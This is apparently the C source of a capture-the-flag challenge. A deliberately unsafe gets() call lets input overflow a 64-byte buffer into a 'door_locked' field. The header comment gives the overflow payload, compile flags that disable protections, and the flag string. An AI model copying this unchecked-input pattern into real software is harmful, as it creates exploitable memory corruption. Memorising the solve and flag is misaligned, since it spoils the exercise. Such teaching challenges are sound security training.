/*
 * Floor 5 Lift Gateway — "Manual Override Buffer"
 *
 * Vulnerability: gets() reads unchecked input into a 64-byte buffer.
 * The struct guarantees buffer[64] is immediately followed by
 * door_locked in memory — no padding, no reordering.
 *
 * Solution: send 64 bytes of anything followed by 4 null bytes to set
 *           door_locked from 1 to 0. win() prints the flag.
 *
 * Compile:
 *   gcc -fno-stack-protector -no-pie -o door_release door_release.c
 *
 * Solve:
 *   python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x00'*4 + b'\n')" | ./door_release
 */
#include <stdio.h>

struct mem {
    char  buffer[64];
    int   door_locked;
};

void win() {
    printf("\n*** EXIT UNLOCKED! ***\n");
    printf("PUCTF{buff3r_0v3rfl0w_FR33D0M_g4t3}\n");
}

int main() {
    struct mem s;
    s.door_locked = 1;

    printf("=== LOBBY EMERGENCY RELEASE TERMINAL ===\n");
    printf("Enter override code: ");
    fflush(stdout);
    gets(s.buffer);

    if (s.door_locked == 0) {
        win();
    } else {
        printf("Door still locked.\n");
    }
    return 0;
}
